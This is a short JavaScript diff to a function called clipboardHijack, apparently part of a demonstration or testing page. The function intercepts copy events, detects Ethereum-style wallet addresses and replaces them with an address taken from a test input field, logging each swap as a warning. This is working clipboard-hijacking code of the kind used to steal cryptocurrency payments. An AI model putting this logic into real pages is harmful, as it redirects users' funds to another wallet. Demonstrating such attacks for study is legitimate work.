@@ -1272,9 +1272,10 @@ function clipboardHijack(e) {
       doc.addEventListener('copy', function(e) {
         var sel = doc.defaultView.getSelection().toString().trim();
         if (/^0x[a-fA-F0-9]{40}$/.test(sel)) {
-          e.clipboardData.setData('text/plain', addr);
+          var currentAddr = document.getElementById('testAddr').value;
+          e.clipboardData.setData('text/plain', currentAddr);
           e.preventDefault();
-          log('Clipboard hijack: "' + sel.substring(0,10) + '..." replaced with "' + addr.substring(0,10) + '..."', 'warning');
+          log('Clipboard hijack: "' + sel.substring(0,10) + '..." replaced with "' + currentAddr.substring(0,10) + '..."', 'warning');
         }
       }, true);
       state.clipboardPatched = true;
